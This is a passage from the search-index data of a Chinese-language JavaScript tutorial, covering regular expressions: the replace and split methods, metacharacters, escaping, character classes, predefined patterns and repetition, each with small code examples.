id=\"p2\">$9.99</span><span id=\"p3\">$5.00</span>\" \u4e0a\u9762\u4ee3\u7801\u7684\u6355\u6349\u6a21\u5f0f\u4e2d\uff0c\u6709\u56db\u4e2a\u62ec\u53f7\uff0c\u6240\u4ee5\u4f1a\u4ea7\u751f\u56db\u4e2a\u7ec4\u5339\u914d\uff0c\u5728\u5339\u914d\u51fd\u6570\u4e2d\u7528 $1 \u5230 $4 \u8868\u793a\u3002\u5339\u914d\u51fd\u6570\u7684\u4f5c\u7528\u662f\u5c06\u4ef7\u683c\u63d2\u5165\u6a21\u677f\u4e2d\u3002","title":"String.prototype.replace()"},{"location":"stdlib/regexp/#stringprototypesplit","text":"\u5b57\u7b26\u4e32\u5bf9\u8c61\u7684 split \u65b9\u6cd5\u6309\u7167\u6b63\u5219\u89c4\u5219\u5206\u5272\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u7531\u5206\u5272\u540e\u7684\u5404\u4e2a\u90e8\u5206\u7ec4\u6210\u7684\u6570\u7ec4\u3002 1 str . split ( separator , [ limit ]) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u5206\u9694\u89c4\u5219\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8fd4\u56de\u6570\u7ec4\u7684\u6700\u5927\u6210\u5458\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u975e\u6b63\u5219\u5206\u9694 'a, b,c, d' . split ( ',' ) // [ 'a', ' b', 'c', ' d' ] // \u6b63\u5219\u5206\u9694\uff0c\u53bb\u9664\u591a\u4f59\u7684\u7a7a\u683c 'a, b,c, d' . split ( /, */ ) // [ 'a', 'b', 'c', 'd' ] // \u6307\u5b9a\u8fd4\u56de\u6570\u7ec4\u7684\u6700\u5927\u6210\u5458 'a, b,c, d' . split ( /, */ , 2 ) [ 'a' , 'b' ] \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u53bb\u9664\u4e86\u5b50\u5b57\u7b26\u4e32\u7684\u9017\u53f7\u540e\u9762\u7684\u7a7a\u683c\u3002 1 2 3 4 5 6 7 // \u4f8b\u4e00 'aaa*a*' . split ( /a*/ ) // [ '', '*', '*' ] // \u4f8b\u4e8c 'aaa**a*' . split ( /a*/ ) // [\"\", \"*\", \"*\", \"*\"] \u4e0a\u9762\u4ee3\u7801\u7684\u5206\u5272\u89c4\u5219\u662f0\u6b21\u6216\u591a\u6b21\u7684 a \uff0c\u7531\u4e8e\u6b63\u5219\u9ed8\u8ba4\u662f\u8d2a\u5a6a\u5339\u914d\uff0c\u6240\u4ee5\u4f8b\u4e00\u7684\u7b2c\u4e00\u4e2a\u5206\u9694\u7b26\u662f aaa \uff0c\u7b2c\u4e8c\u4e2a\u5206\u5272\u7b26\u662f a \uff0c\u5c06\u5b57\u7b26\u4e32\u5206\u6210\u4e09\u4e2a\u90e8\u5206\uff0c\u5305\u542b\u5f00\u59cb\u5904\u7684\u7a7a\u5b57\u7b26\u4e32\u3002\u4f8b\u4e8c\u7684\u7b2c\u4e00\u4e2a\u5206\u9694\u7b26\u662f aaa \uff0c\u7b2c\u4e8c\u4e2a\u5206\u9694\u7b26\u662f0\u4e2a a \uff08\u5373\u7a7a\u5b57\u7b26\uff09\uff0c\u7b2c\u4e09\u4e2a\u5206\u9694\u7b26\u662f a \uff0c\u6240\u4ee5\u5c06\u5b57\u7b26\u4e32\u5206\u6210\u56db\u4e2a\u90e8\u5206\u3002 \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u5e26\u6709\u62ec\u53f7\uff0c\u5219\u62ec\u53f7\u5339\u914d\u7684\u90e8\u5206\u4e5f\u4f1a\u4f5c\u4e3a\u6570\u7ec4\u6210\u5458\u8fd4\u56de\u3002 1 2 'aaa*a*' . split ( /(a*)/ ) // [ '', 'aaa', '*', 'a', '*' ] \u4e0a\u9762\u4ee3\u7801\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u4e86\u62ec\u53f7\uff0c\u7b2c\u4e00\u4e2a\u7ec4\u5339\u914d\u662f aaa \uff0c\u7b2c\u4e8c\u4e2a\u7ec4\u5339\u914d\u662f a \uff0c\u5b83\u4eec\u90fd\u4f5c\u4e3a\u6570\u7ec4\u6210\u5458\u8fd4\u56de\u3002","title":"String.prototype.split()"},{"location":"stdlib/regexp/#_5","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u89c4\u5219\u5f88\u590d\u6742\uff0c\u4e0b\u9762\u4e00\u4e00\u4ecb\u7ecd\u8fd9\u4e9b\u89c4\u5219\u3002","title":"\u5339\u914d\u89c4\u5219"},{"location":"stdlib/regexp/#_6","text":"\u5927\u90e8\u5206\u5b57\u7b26\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\uff0c\u5c31\u662f\u5b57\u9762\u7684\u542b\u4e49\uff0c\u6bd4\u5982 /a/ \u5339\u914d a \uff0c /b/ \u5339\u914d b \u3002\u5982\u679c\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e4b\u4e2d\uff0c\u67d0\u4e2a\u5b57\u7b26\u53ea\u8868\u793a\u5b83\u5b57\u9762\u7684\u542b\u4e49\uff08\u5c31\u50cf\u524d\u9762\u7684 a \u548c b \uff09\uff0c\u90a3\u4e48\u5b83\u4eec\u5c31\u53eb\u505a\u201c\u5b57\u9762\u91cf\u5b57\u7b26\u201d\uff08literal characters\uff09\u3002 1 /dog/ . test ( 'old dog' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\u6b63\u5219\u8868\u8fbe\u5f0f\u7684 dog \uff0c\u5c31\u662f\u5b57\u9762\u91cf\u5b57\u7b26\uff0c\u6240\u4ee5 /dog/ \u5339\u914d old dog \uff0c\u56e0\u4e3a\u5b83\u5c31\u8868\u793a d \u3001 o \u3001 g \u4e09\u4e2a\u5b57\u6bcd\u8fde\u5728\u4e00\u8d77\u3002 \u9664\u4e86\u5b57\u9762\u91cf\u5b57\u7b26\u4ee5\u5916\uff0c\u8fd8\u6709\u4e00\u90e8\u5206\u5b57\u7b26\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u4e0d\u4ee3\u8868\u5b57\u9762\u7684\u610f\u601d\u3002\u5b83\u4eec\u53eb\u505a\u201c\u5143\u5b57\u7b26\u201d\uff08metacharacters\uff09\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u3002 \uff081\uff09\u70b9\u5b57\u7b26\uff08.) \u70b9\u5b57\u7b26\uff08 . \uff09\u5339\u914d\u9664\u56de\u8f66\uff08 \\r \uff09\u3001\u6362\u884c( \\n ) \u3001\u884c\u5206\u9694\u7b26\uff08 \\u2028 \uff09\u548c\u6bb5\u5206\u9694\u7b26\uff08 \\u2029 \uff09\u4ee5\u5916\u7684\u6240\u6709\u5b57\u7b26\u3002\u6ce8\u610f\uff0c\u5bf9\u4e8e\u7801\u70b9\u5927\u4e8e 0xFFFF \u5b57\u7b26\uff0c\u70b9\u5b57\u7b26\u4e0d\u80fd\u6b63\u786e\u5339\u914d\uff0c\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u4e24\u4e2a\u5b57\u7b26\u3002 1 /c.t/ \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c c.t \u5339\u914d c \u548c t \u4e4b\u95f4\u5305\u542b\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\u7684\u60c5\u51b5\uff0c\u53ea\u8981\u8fd9\u4e09\u4e2a\u5b57\u7b26\u5728\u540c\u4e00\u884c\uff0c\u6bd4\u5982 cat \u3001 c2t \u3001 c-t \u7b49\u7b49\uff0c\u4f46\u662f\u4e0d\u5339\u914d coot \u3002 \uff082\uff09\u4f4d\u7f6e\u5b57\u7b26 \u4f4d\u7f6e\u5b57\u7b26\u7528\u6765\u63d0\u793a\u5b57\u7b26\u6240\u5904\u7684\u4f4d\u7f6e\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u5b57\u7b26\u3002 ^ \u8868\u793a\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e $ \u8868\u793a\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u4f4d\u7f6e 1 2 3 4 5 6 7 8 9 // test\u5fc5\u987b\u51fa\u73b0\u5728\u5f00\u59cb\u4f4d\u7f6e /^test/ . test ( 'test123' ) // true // test\u5fc5\u987b\u51fa\u73b0\u5728\u7ed3\u675f\u4f4d\u7f6e /test$/ . test ( 'new test' ) // true // \u4ece\u5f00\u59cb\u4f4d\u7f6e\u5230\u7ed3\u675f\u4f4d\u7f6e\u53ea\u6709test /^test$/ . test ( 'test' ) // true /^test$/ . test ( 'test test' ) // false \uff083\uff09\u9009\u62e9\u7b26\uff08 | \uff09 \u7ad6\u7ebf\u7b26\u53f7\uff08 | \uff09\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u8868\u793a\u201c\u6216\u5173\u7cfb\u201d\uff08OR\uff09\uff0c\u5373 cat|dog \u8868\u793a\u5339\u914d cat \u6216 dog \u3002 1 /11|22/ . test ( '911' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u6307\u5b9a\u5fc5\u987b\u5339\u914d 11 \u6216 22 \u3002 \u591a\u4e2a\u9009\u62e9\u7b26\u53ef\u4ee5\u8054\u5408\u4f7f\u7528\u3002 1 2 // \u5339\u914dfred\u3001barney\u3001betty\u4e4b\u4e2d\u7684\u4e00\u4e2a /fred|barney|betty/ \u9009\u62e9\u7b26\u4f1a\u5305\u62ec\u5b83\u524d\u540e\u7684\u591a\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5982 /ab|cd/ \u6307\u7684\u662f\u5339\u914d ab \u6216\u8005 cd \uff0c\u800c\u4e0d\u662f\u6307\u5339\u914d b \u6216\u8005 c \u3002\u5982\u679c\u60f3\u4fee\u6539\u8fd9\u4e2a\u884c\u4e3a\uff0c\u53ef\u4ee5\u4f7f\u7528\u5706\u62ec\u53f7\u3002 1 /a( |\\t)b/ . test ( 'a\\tb' ) // true \u4e0a\u9762\u4ee3\u7801\u6307\u7684\u662f\uff0c a \u548c b \u4e4b\u95f4\u6709\u4e00\u4e2a\u7a7a\u683c\u6216\u8005\u4e00\u4e2a\u5236\u8868\u7b26\u3002 \u5176\u4ed6\u7684\u5143\u5b57\u7b26\u8fd8\u5305\u62ec \\ \u3001 * \u3001 + \u3001 ? \u3001 () \u3001 [] \u3001 {} \u7b49\uff0c\u5c06\u5728\u4e0b\u6587\u89e3\u91ca\u3002","title":"\u5b57\u9762\u91cf\u5b57\u7b26\u548c\u5143\u5b57\u7b26"},{"location":"stdlib/regexp/#_7","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u90a3\u4e9b\u6709\u7279\u6b8a\u542b\u4e49\u7684\u5143\u5b57\u7b26\uff0c\u5982\u679c\u8981\u5339\u914d\u5b83\u4eec\u672c\u8eab\uff0c\u5c31\u9700\u8981\u5728\u5b83\u4eec\u524d\u9762\u8981\u52a0\u4e0a\u53cd\u659c\u6760\u3002\u6bd4\u5982\u8981\u5339\u914d + \uff0c\u5c31\u8981\u5199\u6210 \\+ \u3002 1 2 3 4 5 /1+1/ . test ( '1+1' ) // false /1\\+1/ . test ( '1+1' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u4e4b\u6240\u4ee5\u4e0d\u5339\u914d\uff0c\u56e0\u4e3a\u52a0\u53f7\u662f\u5143\u5b57\u7b26\uff0c\u4e0d\u4ee3\u8868\u81ea\u8eab\u3002\u7b2c\u4e8c\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u53cd\u659c\u6760\u5bf9\u52a0\u53f7\u8f6c\u4e49\uff0c\u5c31\u80fd\u5339\u914d\u6210\u529f\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\uff0c\u9700\u8981\u53cd\u659c\u6760\u8f6c\u4e49\u7684\uff0c\u4e00\u5171\u670912\u4e2a\u5b57\u7b26\uff1a ^ \u3001 . \u3001 [ \u3001 $ \u3001 ( \u3001 ) \u3001 | \u3001 * \u3001 + \u3001 ? \u3001 { \u548c \\ \u3002\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4f7f\u7528 RegExp \u65b9\u6cd5\u751f\u6210\u6b63\u5219\u5bf9\u8c61\uff0c\u8f6c\u4e49\u9700\u8981\u4f7f\u7528\u4e24\u4e2a\u659c\u6760\uff0c\u56e0\u4e3a\u5b57\u7b26\u4e32\u5185\u90e8\u4f1a\u5148\u8f6c\u4e49\u4e00\u6b21\u3002 1 2 3 4 5 ( new RegExp ( '1\\+1' )). test ( '1+1' ) // false ( new RegExp ( '1\\\\+1' )). test ( '1+1' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c RegExp \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u4f46\u662f\uff0c\u5728\u5b57\u7b26\u4e32\u5185\u90e8\uff0c\u53cd\u659c\u6760\u4e5f\u662f\u8f6c\u4e49\u5b57\u7b26\uff0c\u6240\u4ee5\u5b83\u4f1a\u5148\u88ab\u53cd\u659c\u6760\u8f6c\u4e49\u4e00\u6b21\uff0c\u7136\u540e\u518d\u88ab\u6b63\u5219\u8868\u8fbe\u5f0f\u8f6c\u4e49\u4e00\u6b21\uff0c\u56e0\u6b64\u9700\u8981\u4e24\u4e2a\u53cd\u659c\u6760\u8f6c\u4e49\u3002","title":"\u8f6c\u4e49\u7b26"},{"location":"stdlib/regexp/#_8","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u4e00\u4e9b\u4e0d\u80fd\u6253\u5370\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u63d0\u4f9b\u4e86\u8868\u8fbe\u65b9\u6cd5\u3002 \\cX \u8868\u793a Ctrl-[X] \uff0c\u5176\u4e2d\u7684 X \u662fA-Z\u4e4b\u4e2d\u4efb\u4e00\u4e2a\u82f1\u6587\u5b57\u6bcd\uff0c\u7528\u6765\u5339\u914d\u63a7\u5236\u5b57\u7b26\u3002 [\\b] \u5339\u914d\u9000\u683c\u952e(U+0008)\uff0c\u4e0d\u8981\u4e0e \\b \u6df7\u6dc6\u3002 \\n \u5339\u914d\u6362\u884c\u952e\u3002 \\r \u5339\u914d\u56de\u8f66\u952e\u3002 \\t \u5339\u914d\u5236\u8868\u7b26 tab\uff08U+0009\uff09\u3002 \\v \u5339\u914d\u5782\u76f4\u5236\u8868\u7b26\uff08U+000B\uff09\u3002 \\f \u5339\u914d\u6362\u9875\u7b26\uff08U+000C\uff09\u3002 \\0 \u5339\u914d null \u5b57\u7b26\uff08U+0000\uff09\u3002 \\xhh \u5339\u914d\u4e00\u4e2a\u4ee5\u4e24\u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff08 \\x00 - \\xFF \uff09\u8868\u793a\u7684\u5b57\u7b26\u3002 \\uhhhh \u5339\u914d\u4e00\u4e2a\u4ee5\u56db\u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff08 \\u0000 - \\uFFFF \uff09\u8868\u793a\u7684 Unicode \u5b57\u7b26\u3002","title":"\u7279\u6b8a\u5b57\u7b26"},{"location":"stdlib/regexp/#_9","text":"\u5b57\u7b26\u7c7b\uff08class\uff09\u8868\u793a\u6709\u4e00\u7cfb\u5217\u5b57\u7b26\u53ef\u4f9b\u9009\u62e9\uff0c\u53ea\u8981\u5339\u914d\u5176\u4e2d\u4e00\u4e2a\u5c31\u53ef\u4ee5\u4e86\u3002\u6240\u6709\u53ef\u4f9b\u9009\u62e9\u7684\u5b57\u7b26\u90fd\u653e\u5728\u65b9\u62ec\u53f7\u5185\uff0c\u6bd4\u5982 [xyz] \u8868\u793a x \u3001 y \u3001 z \u4e4b\u4e2d\u4efb\u9009\u4e00\u4e2a\u5339\u914d\u3002 1 2 /[abc]/ . test ( 'hello world' ) // false /[abc]/ . test ( 'apple' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 hello world \u4e0d\u5305\u542b a \u3001 b \u3001 c \u8fd9\u4e09\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4efb\u4e00\u4e2a\uff0c\u6240\u4ee5\u8fd4\u56de false \uff1b\u5b57\u7b26\u4e32 apple \u5305\u542b\u5b57\u6bcd a \uff0c\u6240\u4ee5\u8fd4\u56de true \u3002 \u6709\u4e24\u4e2a\u5b57\u7b26\u5728\u5b57\u7b26\u7c7b\u4e2d\u6709\u7279\u6b8a\u542b\u4e49\u3002 \uff081\uff09\u8131\u5b57\u7b26\uff08^\uff09 \u5982\u679c\u65b9\u62ec\u53f7\u5185\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f [^] \uff0c\u5219\u8868\u793a\u9664\u4e86\u5b57\u7b26\u7c7b\u4e4b\u4e2d\u7684\u5b57\u7b26\uff0c\u5176\u4ed6\u5b57\u7b26\u90fd\u53ef\u4ee5\u5339\u914d\u3002\u6bd4\u5982\uff0c [^xyz] \u8868\u793a\u9664\u4e86 x \u3001 y \u3001 z \u4e4b\u5916\u90fd\u53ef\u4ee5\u5339\u914d\u3002 1 2 /[^abc]/ . test ( 'bbc news' ) // true /[^abc]/ . test ( 'bbc' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 bbc news \u5305\u542b a \u3001 b \u3001 c \u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\uff0c\u6240\u4ee5\u8fd4\u56de true \uff1b\u5b57\u7b26\u4e32 bbc \u4e0d\u5305\u542b a \u3001 b \u3001 c \u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\uff0c\u6240\u4ee5\u8fd4\u56de false \u3002 \u5982\u679c\u65b9\u62ec\u53f7\u5185\u6ca1\u6709\u5176\u4ed6\u5b57\u7b26\uff0c\u5373\u53ea\u6709 [^] \uff0c\u5c31\u8868\u793a\u5339\u914d\u4e00\u5207\u5b57\u7b26\uff0c\u5176\u4e2d\u5305\u62ec\u6362\u884c\u7b26\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u70b9\u53f7\u4f5c\u4e3a\u5143\u5b57\u7b26\uff08 . \uff09\u662f\u4e0d\u5305\u62ec\u6362\u884c\u7b26\u7684\u3002 1 2 3 4 var s = 'Please yes\\nmake my day!' ; s . match ( /yes.*day/ ) // null s . match ( /yes[^]*day/ ) // [ 'yes\\nmake my day'] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 s \u542b\u6709\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u70b9\u53f7\u4e0d\u5305\u62ec\u6362\u884c\u7b26\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5931\u8d25\uff1b\u7b2c\u4e8c\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f [^] \u5305\u542b\u4e00\u5207\u5b57\u7b26\uff0c\u6240\u4ee5\u5339\u914d\u6210\u529f\u3002 \u6ce8\u610f\uff0c\u8131\u5b57\u7b26\u53ea\u6709\u5728\u5b57\u7b26\u7c7b\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u624d\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u5426\u5219\u5c31\u662f\u5b57\u9762\u542b\u4e49\u3002 \uff082\uff09\u8fde\u5b57\u7b26\uff08-\uff09 \u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u8fde\u7eed\u5e8f\u5217\u7684\u5b57\u7b26\uff0c\u8fde\u5b57\u7b26\uff08 - \uff09\u7528\u6765\u63d0\u4f9b\u7b80\u5199\u5f62\u5f0f\uff0c\u8868\u793a\u5b57\u7b26\u7684\u8fde\u7eed\u8303\u56f4\u3002\u6bd4\u5982\uff0c [abc] \u53ef\u4ee5\u5199\u6210 [a-c] \uff0c [0123456789] \u53ef\u4ee5\u5199\u6210 [0-9] \uff0c\u540c\u7406 [A-Z] \u8868\u793a26\u4e2a\u5927\u5199\u5b57\u6bcd\u3002 1 2 /a-z/ . test ( 'b' ) // false /[a-z]/ . test ( 'b' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f53\u8fde\u5b57\u53f7\uff08dash\uff09\u4e0d\u51fa\u73b0\u5728\u65b9\u62ec\u53f7\u4e4b\u4e2d\uff0c\u5c31\u4e0d\u5177\u5907\u7b80\u5199\u7684\u4f5c\u7528\uff0c\u53ea\u4ee3\u8868\u5b57\u9762\u7684\u542b\u4e49\uff0c\u6240\u4ee5\u4e0d\u5339\u914d\u5b57\u7b26 b \u3002\u53ea\u6709\u5f53\u8fde\u5b57\u53f7\u7528\u5728\u65b9\u62ec\u53f7\u4e4b\u4e2d\uff0c\u624d\u8868\u793a\u8fde\u7eed\u7684\u5b57\u7b26\u5e8f\u5217\u3002 \u4ee5\u4e0b\u90fd\u662f\u5408\u6cd5\u7684\u5b57\u7b26\u7c7b\u7b80\u5199\u5f62\u5f0f\u3002 1 2 3 4 [ 0 - 9. ,] [ 0 - 9 a - fA - F ] [ a - zA - Z0 - 9 - ] [ 1 - 31 ] \u4e0a\u9762\u4ee3\u7801\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u7c7b [1-31] \uff0c\u4e0d\u4ee3\u8868 1 \u5230 31 \uff0c\u53ea\u4ee3\u8868 1 \u5230 3 \u3002 \u8fde\u5b57\u7b26\u8fd8\u53ef\u4ee5\u7528\u6765\u6307\u5b9a Unicode \u5b57\u7b26\u7684\u8303\u56f4\u3002 1 2 3 var str = \"\\u0130\\u0131\\u0132\" ; /[\\u0128-\\uFFFF]/ . test ( str ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c \\u0128-\\uFFFF \u8868\u793a\u5339\u914d\u7801\u70b9\u5728 0128 \u5230 FFFF \u4e4b\u95f4\u7684\u6240\u6709\u5b57\u7b26\u3002 \u53e6\u5916\uff0c\u4e0d\u8981\u8fc7\u5206\u4f7f\u7528\u8fde\u5b57\u7b26\uff0c\u8bbe\u5b9a\u4e00\u4e2a\u5f88\u5927\u7684\u8303\u56f4\uff0c\u5426\u5219\u5f88\u53ef\u80fd\u9009\u4e2d\u610f\u6599\u4e4b\u5916\u7684\u5b57\u7b26\u3002\u6700\u5178\u578b\u7684\u4f8b\u5b50\u5c31\u662f [A-z] \uff0c\u8868\u9762\u4e0a\u5b83\u662f\u9009\u4e2d\u4ece\u5927\u5199\u7684 A \u5230\u5c0f\u5199\u7684 z \u4e4b\u95f452\u4e2a\u5b57\u6bcd\uff0c\u4f46\u662f\u7531\u4e8e\u5728 ASCII \u7f16\u7801\u4e4b\u4e2d\uff0c\u5927\u5199\u5b57\u6bcd\u4e0e\u5c0f\u5199\u5b57\u6bcd\u4e4b\u95f4\u8fd8\u6709\u5176\u4ed6\u5b57\u7b26\uff0c\u7ed3\u679c\u5c31\u4f1a\u51fa\u73b0\u610f\u6599\u4e4b\u5916\u7684\u7ed3\u679c\u3002 1 /[A-z]/ . test ( '\\\\' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u53cd\u659c\u6760\uff08'\\'\uff09\u7684ASCII\u7801\u5728\u5927\u5199\u5b57\u6bcd\u4e0e\u5c0f\u5199\u5b57\u6bcd\u4e4b\u95f4\uff0c\u7ed3\u679c\u4f1a\u88ab\u9009\u4e2d\u3002","title":"\u5b57\u7b26\u7c7b"},{"location":"stdlib/regexp/#_10","text":"\u9884\u5b9a\u4e49\u6a21\u5f0f\u6307\u7684\u662f\u67d0\u4e9b\u5e38\u89c1\u6a21\u5f0f\u7684\u7b80\u5199\u65b9\u5f0f\u3002 \\d \u5339\u914d0-9\u4e4b\u95f4\u7684\u4efb\u4e00\u6570\u5b57\uff0c\u76f8\u5f53\u4e8e [0-9] \u3002 \\D \u5339\u914d\u6240\u67090-9\u4ee5\u5916\u7684\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [^0-9] \u3002 \\w \u5339\u914d\u4efb\u610f\u7684\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e [A-Za-z0-9_] \u3002 \\W \u9664\u6240\u6709\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\u4ee5\u5916\u7684\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [^A-Za-z0-9_] \u3002 \\s \u5339\u914d\u7a7a\u683c\uff08\u5305\u62ec\u6362\u884c\u7b26\u3001\u5236\u8868\u7b26\u3001\u7a7a\u683c\u7b26\u7b49\uff09\uff0c\u76f8\u7b49\u4e8e [ \\t\\r\\n\\v\\f] \u3002 \\S \u5339\u914d\u975e\u7a7a\u683c\u7684\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [^ \\t\\r\\n\\v\\f] \u3002 \\b \u5339\u914d\u8bcd\u7684\u8fb9\u754c\u3002 \\B \u5339\u914d\u975e\u8bcd\u8fb9\u754c\uff0c\u5373\u5728\u8bcd\u7684\u5185\u90e8\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 // \\s \u7684\u4f8b\u5b50 /\\s\\w*/ . exec ( 'hello world' ) // [\" world\"] // \\b \u7684\u4f8b\u5b50 /\\bworld/ . test ( 'hello world' ) // true /\\bworld/ . test ( 'hello-world' ) // true /\\bworld/ . test ( 'helloworld' ) // false // \\B \u7684\u4f8b\u5b50 /\\Bworld/ . test ( 'hello-world' ) // false /\\Bworld/ . test ( 'helloworld' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c \\s \u8868\u793a\u7a7a\u683c\uff0c\u6240\u4ee5\u5339\u914d\u7ed3\u679c\u4f1a\u5305\u62ec\u7a7a\u683c\u3002 \\b \u8868\u793a\u8bcd\u7684\u8fb9\u754c\uff0c\u6240\u4ee5 world \u7684\u8bcd\u9996\u5fc5\u987b\u72ec\u7acb\uff08\u8bcd\u5c3e\u662f\u5426\u72ec\u7acb\u672a\u6307\u5b9a\uff09\uff0c\u624d\u4f1a\u5339\u914d\u3002\u540c\u7406\uff0c \\B \u8868\u793a\u975e\u8bcd\u7684\u8fb9\u754c\uff0c\u53ea\u6709 world \u7684\u8bcd\u9996\u4e0d\u72ec\u7acb\uff0c\u624d\u4f1a\u5339\u914d\u3002 \u901a\u5e38\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u9047\u5230\u6362\u884c\u7b26\uff08 \\n \uff09\u5c31\u4f1a\u505c\u6b62\u5339\u914d\u3002 1 2 3 4 var html = \"<b>Hello</b>\\n<i>world!</i>\" ; /.*/ . exec ( html )[ 0 ] // \"<b>Hello</b>\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 html \u5305\u542b\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u7ed3\u679c\u70b9\u5b57\u7b26\uff08 . \uff09\u4e0d\u5339\u914d\u6362\u884c\u7b26\uff0c\u5bfc\u81f4\u5339\u914d\u7ed3\u679c\u53ef\u80fd\u4e0d\u7b26\u5408\u539f\u610f\u3002\u8fd9\u65f6\u4f7f\u7528 \\s \u5b57\u7b26\u7c7b\uff0c\u5c31\u80fd\u5305\u62ec\u6362\u884c\u7b26\u3002 1 2 3 4 var html = \"<b>Hello</b>\\n<i>world!</i>\" ; /[\\S\\s]*/ . exec ( html )[ 0 ] // \"<b>Hello</b>\\n<i>world!</i>\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c [\\S\\s] \u6307\u4ee3\u4e00\u5207\u5b57\u7b26\u3002","title":"\u9884\u5b9a\u4e49\u6a21\u5f0f"},{"location":"stdlib/regexp/#_11","text":"\u6a21\u5f0f\u7684\u7cbe\u786e\u5339\u914d\u6b21\u6570\uff0c\u4f7f\u7528\u5927\u62ec\u53f7\uff08 {} \uff09\u8868\u793a\u3002 {n} \u8868\u793a\u6070\u597d\u91cd\u590d n \u6b21\uff0c {n,} \u8868\u793a\u81f3\u5c11\u91cd\u590d n \u6b21\uff0c {n,m} \u8868\u793a\u91cd\u590d\u4e0d\u5c11\u4e8e n \u6b21\uff0c\u4e0d\u591a\u4e8e m \u6b21\u3002 1 2 /lo{2}k/ . test ( 'look' ) // true /lo{2,5}k/ . test ( 'looook' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u6a21\u5f0f\u6307\u5b9a o \u8fde\u7eed\u51fa\u73b02\u6b21\uff0c\u7b2c\u4e8c\u4e2a\u6a21\u5f0f\u6307\u5b9a o \u8fde\u7eed\u51fa\u73b02\u6b21\u52305\u6b21\u4e4b\u95f4\u3002","title":"\u91cd\u590d\u7c7b"},{"location":"stdlib/regexp/#_12","text":"\u91cf\u8bcd\u7b26\u7528\u6765\u8bbe\u5b9a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b0\u7684\u6b21\u6570\u3002 ? 